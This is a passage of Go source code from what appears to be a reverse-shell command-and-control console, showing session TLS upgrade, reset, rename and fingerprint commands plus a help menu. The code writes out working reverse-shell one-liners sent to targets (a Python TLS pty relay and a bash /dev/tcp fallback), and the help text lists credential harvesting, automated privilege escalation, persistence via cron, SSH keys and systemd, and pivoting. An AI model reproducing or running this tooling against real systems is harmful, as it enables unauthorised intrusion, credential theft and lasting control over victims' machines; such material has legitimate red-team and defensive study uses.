		}
	}

	// Require an active listener for the target to reconnect to.
	if c.listeners.findByPort(listenerAddr) == nil {
		fmt.Printf("[!] Listener %s is no longer active — restart it and retry.\n", listenerAddr)
		return
	}

	effectiveListenIP := strings.Trim(hostFromAddr(plainConn.LocalAddr()), "[]")
	if effectiveListenIP == "" {
		effectiveListenIP, _, _ = net.SplitHostPort(listenerAddr)
	}
	_, portStr, _ := net.SplitHostPort(listenerAddr)
	listenPort := 4444
	if p, convErr := strconv.Atoi(portStr); convErr == nil {
		listenPort = p
	}

	reconnectCmd := fmt.Sprintf(
		`%s -c "import socket,ssl,os,pty,threading,hashlib,subprocess as sp;m,sv=pty.openpty();p=sp.Popen(['/bin/bash'],stdin=sv,stdout=sv,stderr=sv,start_new_session=True,close_fds=True,pass_fds=[m]);os.close(sv);ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT);ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;t=ctx.wrap_socket(socket.create_connection(('%s',%d),timeout=10));assert hashlib.sha256(t.getpeercert(binary_form=True)).hexdigest()=='%s';exec('def rd():\n try:\n  while 1:\n   d=t.read(4096)\n   if d:os.write(m,d)\n   else:break\n except:pass\nthreading.Thread(target=rd,daemon=True).start()\ntry:\n while 1:\n  d=os.read(m,4096)\n  t.write(d)\nexcept:pass')"`,
		upgrader.pythonBin, effectiveListenIP, listenPort, c.opts.fingerprintHex,
	)

	// Register the routing claim BEFORE sending the command so acceptLoop
	// never races to accept the reconnect as a new session.
	origIP := hostFromAddr(plainConn.RemoteAddr())
	upgradeCh := make(chan net.Conn, 1)
	c.pendingTLSMu.Lock()
	c.pendingTLSUpgrade[origIP] = upgradeCh
	c.pendingTLSMu.Unlock()

	if writeErr := upgrader.write(reconnectCmd + "\n"); writeErr != nil {
		c.pendingTLSMu.Lock()
		delete(c.pendingTLSUpgrade, origIP)
		c.pendingTLSMu.Unlock()
		fmt.Printf("[!] Failed to send command to session %d: %v\n", id, writeErr)
		return
	}

	if c.opts.verbosity >= 1 {
		fmt.Printf("[*] Waiting for TLS reconnect from %s (10s timeout)...\n", origIP)
	}

	// The rest runs in a goroutine so the operator prompt returns immediately.
	tlsCfg := c.opts.tlsCfg
	verbosity := c.opts.verbosity
	go func() {
		defer func() {
			c.pendingTLSMu.Lock()
			delete(c.pendingTLSUpgrade, origIP)
			c.pendingTLSMu.Unlock()
		}()

		var rawConn net.Conn
		select {
		case rawConn = <-upgradeCh:
		case <-time.After(10 * time.Second):
			if verbosity >= 1 {
				c.printer.Notify("[!] Session %d TLS upgrade failed — reconnect timed out.", id)
			} else {
				c.printer.Notify("[!] Session %d TLS upgrade failed.", id)
			}
			return
		}

		// Verify TLS ClientHello and complete handshake.
		buf := make([]byte, 1)
		n, readErr := rawConn.Read(buf)
		if readErr != nil || n == 0 || buf[0] != 0x16 {
			rawConn.Close()
			if verbosity >= 1 {
				c.printer.Notify("[!] Session %d TLS upgrade failed — unexpected byte 0x%02x (expected TLS ClientHello 0x16).", id, buf[0])
			} else {
				c.printer.Notify("[!] Session %d TLS upgrade failed.", id)
			}
			return
		}
		candidate := tls.Server(&prefixConn{Conn: rawConn, prefix: buf}, tlsCfg)
		if hsErr := candidate.Handshake(); hsErr != nil {
			candidate.Close()
			if verbosity >= 1 {
				c.printer.Notify("[!] Session %d TLS upgrade failed — handshake: %v", id, hsErr)
			} else {
				c.printer.Notify("[!] Session %d TLS upgrade failed.", id)
			}
			return
		}

		// Upgrade in-place — session keeps its ID, no new session is created.
		// Plain conn stays open (closing it sends SIGHUP to the remote pty.spawn).
		upgrader.switchConn(candidate)
		sess.mu.Lock()
		sess.ActiveConn = candidate
		sess.TLS = true
		sess.mu.Unlock()

		// Reinitialise terminal on the new bash spawned by the Python relay.
		// Without this the new shell has no TERM, wrong stty size, and no
		// readline line-editing — typing would appear to do nothing.
		reinitTerminal(upgrader)

		// Start a drain on the new TLS conn so remote output doesn't back up
		// while the session is backgrounded between now and the next 'use'.
		c.startDrain(sess, candidate)

		c.printer.Notify("[+] Session %d upgraded to TLS successfully.", id)
	}()
}

// cmdReset spawns a new reverse-shell connection from an existing session, then
// tears down the old one.  The spawned process runs under setsid so it lives in
// its own session and is not killed when the parent shell receives SIGHUP on
// connection close.  The new shell arrives via the normal acceptLoop → handleSession
// path, so it gets PTY upgrade, optional TLS, and recon automatically.
func (c *Console) cmdReset(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: reset <id>")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}

	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	state := sess.State
	upgrader := sess.Upgrader
	listenerAddr := sess.ListenerAddr
	plainConn := sess.Conn
	activeConn := sess.ActiveConn
	if activeConn == nil {
		activeConn = plainConn
	}
	sess.mu.Unlock()

	if state == SessionStateInteractive {
		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
		return
	}
	if state == SessionStateTerminated {
		fmt.Printf("[!] Session %d has been terminated.\n", id)
		return
	}
	if upgrader == nil {
		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
		return
	}

	// Require an active listener so the new shell has somewhere to land.
	entry := c.listeners.findByPort(listenerAddr)
	if entry == nil {
		fmt.Printf("[!] Listener %s is no longer active — restart it with 'listen %s' and retry.\n",
			listenerAddr, listenerAddr)
		return
	}

	// Derive the local IP the target originally connected to.
	effectiveListenIP := strings.Trim(hostFromAddr(plainConn.LocalAddr()), "[]")
	if effectiveListenIP == "" {
		effectiveListenIP, _, _ = net.SplitHostPort(listenerAddr)
	}
	_, portStr, _ := net.SplitHostPort(listenerAddr)
	listenPort := 4444
	if p, convErr := strconv.Atoi(portStr); convErr == nil {
		listenPort = p
	}

	// setsid puts the new bash in its own session so it survives the parent
	// shell closing (no SIGHUP propagation).
	//
	// If TLS is enabled globally and Python was used for PTY upgrade,
	// use the Python TLS relay so the new connection arrives encrypted.
	// Cert verification is disabled via verify_mode=ssl.CERT_NONE.
	var reconnectCmd string
	if upgrader.UsedPython() && c.opts.tlsEnabled {
		// Python TLS relay — fingerprint-pinned, identical to handleSession and
		// cmdTLSUpgrade so all three TLS paths have the same MITM protection.
		reconnectCmd = fmt.Sprintf(
			`%s -c "import socket,ssl,os,pty,threading,hashlib,subprocess as sp;m,sv=pty.openpty();p=sp.Popen(['/bin/bash'],stdin=sv,stdout=sv,stderr=sv,start_new_session=True,close_fds=True,pass_fds=[m]);os.close(sv);ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT);ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;t=ctx.wrap_socket(socket.create_connection(('%s',%d),timeout=10));assert hashlib.sha256(t.getpeercert(binary_form=True)).hexdigest()=='%s';exec('def rd():\n try:\n  while 1:\n   d=t.read(4096)\n   if d:os.write(m,d)\n   else:break\n except:pass\nthreading.Thread(target=rd,daemon=True).start()\ntry:\n while 1:\n  d=os.read(m,4096)\n  t.write(d)\nexcept:pass')"`,
			upgrader.PythonBin(), effectiveListenIP, listenPort, c.opts.fingerprintHex,
		)
	} else {
		// Fallback: plain /dev/tcp or python socket
		reconnectCmd = fmt.Sprintf(
			`(setsid bash -i >& /dev/tcp/%s/%d 0>&1 2>&1 &) 2>/dev/null || `+
				`(setsid python3 -c 'import socket,os,pty;s=socket.socket();`+
				`s.connect(("%s",%d));[os.dup2(s.fileno(),f) for f in(0,1,2)];`+
				`pty.spawn("/bin/bash")' &) 2>/dev/null`,
			effectiveListenIP, listenPort,
			effectiveListenIP, listenPort,
		)
	}

	fmt.Printf("[*] Resetting session %d — spawning new shell to %s:%d...\n",
		id, effectiveListenIP, listenPort)

	if writeErr := upgrader.write(reconnectCmd + "\n"); writeErr != nil {
		fmt.Printf("[!] Failed to send reset command to session %d: %v\n", id, writeErr)
		return
	}

	// Give the spawned process a moment to connect before we close the parent.
	// After close + Remove, acceptLoop will see the new connection as a fresh session.
	time.Sleep(300 * time.Millisecond)

	// Close the old session without killRemoteProcessGroup: we don't want to
	// SIGKILL the newly spawned setsid'd process (different session but still
	// same UID — pkill -g $$ would not reach it, but be safe and skip it).
	if activeConn != nil {
		activeConn.Close()
	}
	if plainConn != nil && plainConn != activeConn {
		plainConn.Close()
	}
	c.registry.Remove(id)

	fmt.Printf("[*] Session %d closed. New session will appear automatically when the target reconnects.\n", id)
}

func (c *Console) cmdRename(args []string) {
	if len(args) < 2 {
		fmt.Println("[!] Usage: rename <id> <name>")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}
	name := sanitizeLabel(args[1])
	if name == "" {
		fmt.Println("[!] Name must contain only letters, digits, '-', '_', or '.'")
		return
	}
	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}
	sess.mu.Lock()
	sess.Label = name
	sess.mu.Unlock()
	fmt.Printf("[*] Session %d renamed to: %s\n", id, name)

	// Sync name into persistence store so reconnects are auto-labelled.
	// Upsert: create the entry if it doesn't exist yet (e.g. no recon run).
	c.persistMu.Lock()
	meta := c.persist.Sessions[id]
	meta.ID = id
	meta.Name = name
	if meta.IP == "" {
		meta.IP = sess.remoteHost()
	}
	if meta.Listener == "" {
		meta.Listener = sess.ListenerAddr
	}
	c.persist.Sessions[id] = meta
	c.persist.Save() //nolint:errcheck
	c.persistMu.Unlock()
}

func (c *Console) cmdFingerprint(args []string) {
	if c.opts.fingerprint == "" {
		fmt.Println("[!] No TLS certificate configured. Use --tls at startup or 'tls <id>' to generate one.")
		return
	}
	if len(args) == 0 {
		fmt.Printf("[*] TLS certificate fingerprint:\n    %s\n", c.opts.fingerprint)
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}
	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}
	sess.mu.Lock()
	isTLS := sess.TLS
	sess.mu.Unlock()
	if !isTLS {
		fmt.Printf("[!] Session %d is not TLS-encrypted.\n", id)
		return
	}
	fmt.Printf("[*] Session %d TLS certificate fingerprint:\n    %s\n", id, c.opts.fingerprint)
}

func (c *Console) cmdHelp() {
	fmt.Print(`
  SETUP
    listen <host:port>                   Start a listener
    listeners                            List active listeners
    unlisten <port|addr>                 Stop a listener
    generate list                        List supported build targets
    generate <os> <arch> --lhost X       Cross-compile agent binary
    generate oneliner <os> <arch>        Print shell/PS1 deploy one-liner

  SESSIONS
    sessions [filter]                    List sessions (filter: id, ip, os, label)
    use <id>                             Attach interactively — Ctrl+D to background
    kill <id>                            Terminate session
    rename <id> <name>                   Label a session
    info <id>                            Full recon/findings summary
    broadcast <cmd>                      Run command on all active sessions
    export <id|all> [--format json|txt]  Save findings to disk

  RECON & EXPLOITATION
    recon <id>                           Run recon; auto-prints top matches on finish
    exploit list <id>                    Show ranked privesc matches, commands filled in
    exploit <id> [idx]                   Execute match (default: top-ranked)
    exploit auto <id>                    Walk all non-interactive matches until root

  EXECUTION
    exec <id> <cmd>                      Run a single command
    shell <id>                           Interactive shell — Ctrl+D to close  [agent]
    ps <id>                              List running processes
    killproc <id> <pid>                  Kill a process by PID
    download <id> <remote-path>          Download file from session
    upload <id> <remote-path>            Upload file to session
    creds <id> [path]                    Harvest creds: shadow, SSH, env, history, .env

  PERSISTENCE
    persist <id> <method>                Install persistence on session
    persist create <name> <method>       Create a named persistence profile
    persist list [id]                    List profiles / session assignments
    persist assign <pid> <id>            Assign profile to session
    persist unassign <pid> <id>          Remove session from profile
    persist remove <pid>                 Delete a profile

    Linux PTY methods:  cron  bashrc  sshkey  systemd  setuid
    Windows agent:      reg   schtask

  PIVOTING                                                        [agent only]
    pivot <id> --socks5 <port>           SOCKS5 proxy on 127.0.0.1:port
    pivot <id> --fwd <lp>:<host>:<port>  TCP forward localhost:lp → host:port
    scan <id> <cidr|ip> [--ports ...] [--timeout ms]
                                         TCP-connect port scan from agent

  SECURITY
    tls <id>                             Upgrade session to TLS
    fp [id]                              Show / verify TLS certificate fingerprint
    reset <id>                           Respawn shell, close old connection
    firewall create/list/delete <name>
    firewall rule/rules/clear <name> [ip]
    firewall assign <name> <addr>

  MISC
    labels <id> [labels...]              Tag / view session labels
    notes <id> [text...]                 Annotate / view session notes
    config set|show|reset                Application configuration
    help                                 This message
    exit                                 Exit (prompts if sessions are active)
`)
}
